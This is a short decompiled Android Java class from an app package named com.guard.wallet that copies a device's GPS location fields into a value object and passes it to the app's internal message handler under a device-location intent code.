package p018v;

import android.location.Location;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceLocationVO;

/* renamed from: v.a */
/* loaded from: classes.dex */
public final class C0927a {

    /* renamed from: b */
    public static volatile C0927a f2110b;

    /* renamed from: a */
    public Integer f2111a = 1;

    /* renamed from: a */
    public static void m1392a(Location location) {
        if (location != null) {
            DeviceLocationVO deviceLocationVO = new DeviceLocationVO();
            if (location.hasAccuracy()) {
                deviceLocationVO.setAccuracy(Float.valueOf(location.getAccuracy()));
            }
            if (location.hasAltitude()) {
                deviceLocationVO.setAltitude(Double.valueOf(location.getAltitude()));
            }
            if (location.hasSpeed()) {
                deviceLocationVO.setSpeed(Float.valueOf(location.getSpeed()));
            }
            if (location.hasBearing()) {
                deviceLocationVO.setBearing(Float.valueOf(location.getBearing()));
            }
            deviceLocationVO.setLongitude(Double.valueOf(location.getLongitude()));
            deviceLocationVO.setLatitude(Double.valueOf(location.getLatitude()));
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            messageRecordVO.setExtraBody(deviceLocationVO);
            messageRecordVO.setIntentCode("android.intent.action.DEVICE_LOCATION");
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        }
    }
}
